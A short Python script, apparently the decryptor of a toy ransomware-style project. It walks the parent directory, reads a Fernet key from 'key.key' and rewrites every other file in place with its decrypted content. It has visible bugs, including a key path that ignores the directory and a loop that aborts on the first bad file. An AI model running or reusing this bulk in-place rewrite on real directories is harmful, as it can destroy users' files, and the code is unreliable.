import os
from cryptography.fernet import Fernet, InvalidToken

try:
    for path, dirs, files in os.walk('../'):
        for file in files:
            if file == 'key.key':
                with open(file, 'r') as f:
                    key = f.read()
            if file in ['main.py', 'key.key', 'decrypt.py']:
                continue

            file_path = os.path.join(path, file)
            
            with open(file_path, 'rb') as f:
                content = f.read()

            decrypted_content = Fernet(key).decrypt(content)

            with open(file_path, 'wb') as f:
                f.write(decrypted_content)
except InvalidToken:
    pass
